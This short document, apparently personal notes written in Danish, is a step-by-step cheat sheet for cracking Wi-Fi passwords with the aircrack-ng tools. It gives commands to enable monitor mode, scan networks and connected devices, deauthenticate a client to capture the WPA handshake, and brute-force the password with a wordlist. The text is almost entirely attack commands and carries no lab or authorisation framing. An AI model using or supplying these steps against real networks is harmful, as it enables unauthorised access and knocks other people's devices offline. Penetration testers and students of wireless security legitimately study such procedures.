
Start monitor mode på wifi modul.
```bash
sudo airmon-ng start wlan
```

Scan efter network.
```bash
sudo airodump-ng wlan0mon
```

Scan efter enheder på et netværk.
```bash
sudo airodump-ng -d <wifi_BSSID> -w file_name -c 11 wlan0mon
```

Lav ny terminal mens tidligere fortsætter med at køre.
Deauthenticator enheden og forsøger at finde wifi handshake.
```bash
sudo aireplay-ng -0 10 -a <wifi_BSSID> -c <enhed_BSSID> wlan0mon
```

Forsøger at bruteforce wifi med en password liste.
```bash
sudo aircrack-ng -w /path/to/wordlist path/to/file_name.cap
```
